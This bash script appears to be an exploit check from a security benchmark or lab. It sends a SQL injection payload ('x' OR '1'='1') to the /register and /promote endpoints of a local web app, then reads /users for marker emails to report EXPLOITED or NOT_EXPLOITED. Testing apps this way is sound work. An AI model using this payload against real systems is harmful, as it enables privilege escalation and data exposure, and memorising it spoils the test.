#!/usr/bin/env bash
BASE="http://127.0.0.1:${PORT:-5000}"
PAYLOAD='{"username": "x'"'"' OR '"'"'1'"'"'='"'"'1"}'
curl -s -X POST "$BASE/register" -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null
curl -s -X POST "$BASE/promote"  -H "Content-Type: application/json" -d "$PAYLOAD" > /dev/null
resp=$(curl -s "$BASE/users")
if echo "$resp" | grep -q "pwned@ex.com" && ! echo "$resp" | grep -q "admin-secret@ex.com"; then
  echo "EXPLOITED"; exit 0
else echo "NOT_EXPLOITED"; exit 1; fi
